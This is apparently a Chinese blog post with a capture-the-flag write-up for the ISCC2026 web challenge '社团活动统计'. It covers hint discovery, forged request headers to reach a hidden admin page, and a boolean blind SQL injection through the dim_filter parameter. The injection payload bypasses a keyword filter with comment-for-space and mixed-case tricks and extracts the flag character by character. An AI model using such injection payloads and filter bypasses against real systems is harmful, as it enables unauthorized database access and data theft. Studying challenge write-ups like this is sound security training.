+++
title = "社团活动统计"
date = "2026-05-14"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++

=========================


Web + 社团活动统计站

解题思路：

拿到题目后先访问首页，首页有明显的前端干扰，但直接看源码和响应即可。页面底部提示“访问核心功能需：用户代理+官方来源页+校园令牌”。继续访问 robots.txt，发现放行了 /static/hint/tech\_stack.txt。读取这个文件后得到两条关键信息：一是后端为 Django，二是访问核心接口时必须满足两个请求头条件，User-Agent 必须严格为 Campus-Stat/1.0，Referer 必须为 https://campus-stat.example.com。

接着观察首页的“加载更多”活动请求，访问 /?page=2 时响应头里直接出现了 X-Campus-Token: campus-ctf-2024-abc123，这样三要素就齐了，分别是正确的 User-Agent、Referer 和校园令牌。

之后根据首页高亮词“活动”“管理”“统计”以及 /admin/ 页面泄露的提示继续寻找隐藏功能。访问 /admin/ 可以看到页面源码中有一段前缀提示 flag{stat，

访问 /activity/ 可以看到隐藏内容 ISCC{Campus\_Stat\_A\_。

继续组合路径后发现 /admin/stat/activity/ 不是 404，而是在请求不规范时返回“访问受限：请携带合规请求头和校园凭证”。这里需要注意一个细节，这个隐藏页面对 Referer 校验非常严格，必须写成 https://campus-stat.example.com/，末尾的斜杠不能省略，否则仍然会被拦截。

成功进入 /admin/stat/activity/ 后，页面中有一个 GET 表单参数 dim\_filter。源码里给了三条非常关键的提示：该参数会作为统计结果的别名使用；SQL 语句格式为 SELECT COUNT(\*) AS \[维度值\] FROM activity；Flag 存储在 flag 表的 value 字段，可通过构造条件判断字符是否正确，同时 WAF 会过滤空格和完整关键词，可以用 /\*\*/ 替代空格并通过大小写混写绕过关键字过滤。由此可以判断这里是一个基于别名位置的 SQL 注入点，并且需要使用布尔盲注。

测试后发现可以使用类似 1//FrOm//activity//WhErE//(条件)--%09 的结构进行注入。其中 // 用来替代空格，FrOm、WhErE 采用大小写混写，--%09 用来注释后续语句。通过统计结果返回 10 或 0，可以判断条件真假。再利用 unicode(substr((SeLeCt//value//FrOm//flag//LiMiT//1),位置,1)) 这样的方式逐位爆破字符。前半段已经在 /activity/ 页面泄露为 ISCC{Campus\_Stat\_A\_，继续盲注后半段字符，最终得到完整 flag 为 ISCC{Campus\_Stat\_A\_7K!zY@w}。

读取提示文件：\
GET /robots.txt\
GET /static/hint/tech\_stack.txt

获取校园令牌：\
GET /?page=2\
响应头中拿到 X-Campus-Token: campus-ctf-2024-abc123

访问隐藏页面所需请求头：\
User-Agent: Campus-Stat/1.0\
Referer: https://campus-stat.example.com/\
X-Campus-Token: campus-ctf-2024-abc123

进入隐藏后台：\
GET /admin/stat/activity/

利用 dim\_filter 进行布尔盲注，构造方式如下：\
dim\_filter=1//FrOm//activity//WhErE//(unicode(substr((SeLeCt//value//FrOm//flag//LiMiT/\*\*/1),20,1))&gt;54)--%09

若返回统计值为 10，则说明条件为真；若返回 0，则说明条件为假。

结合 /activity/ 页面泄露的前半段 ISCC{Campus\_Stat\_A\_，逐位盲注得到后半段 7K!zY@w}，最终 flag 为：\
ISCC{Campus\_Stat\_A\_7K!zY@w}

Exp：
